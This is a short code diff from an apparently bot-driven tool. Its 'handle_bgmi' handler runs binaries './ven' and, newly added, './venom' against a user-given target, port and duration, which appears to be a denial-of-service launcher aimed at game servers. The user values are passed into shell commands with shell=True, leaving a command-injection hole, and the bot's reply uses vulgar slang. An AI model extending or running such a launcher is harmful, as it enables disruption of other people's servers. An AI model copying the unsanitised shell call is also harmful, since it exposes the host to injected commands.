@@ -198,6 +198,8 @@ def handle_bgmi(message):
                     subprocess.run(full_command, shell=True)
                     full_command = f"./ven {target} {port} {time} 10000000"
                     subprocess.run(full_command, shell=True)
+                    full_command = f"./venom {target} {port} {time}"
+                    subprocess.run(full_command, shell=True)
 
                     response = f"𝐂𝐇𝐔𝐃𝐀𝐈 FINISHED 🎮\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
             except ValueError:
